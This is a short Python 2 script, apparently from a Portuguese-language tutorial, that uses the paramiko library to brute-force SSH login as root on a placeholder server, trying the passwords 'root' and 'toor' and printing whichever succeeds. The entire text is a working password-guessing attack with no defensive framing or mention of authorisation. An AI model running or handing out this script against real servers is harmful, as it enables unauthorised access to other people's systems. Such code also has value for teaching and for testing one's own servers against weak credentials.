import paramiko

host = "IP_do_servidor_SSH"
usuario = "root"
senhas = ["root", "toor"]

conexao = paramiko.SSHClient() #1
conexao.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #2

for senha in senhas:
    try:
        conexao.connect(host, username=usuario, password=senha, timeout=1) #3
    except: #4
        pass
    else: #5
        print "USER:", usuario
        print "PASS:", senha
        break
    finally:
        conexao.close()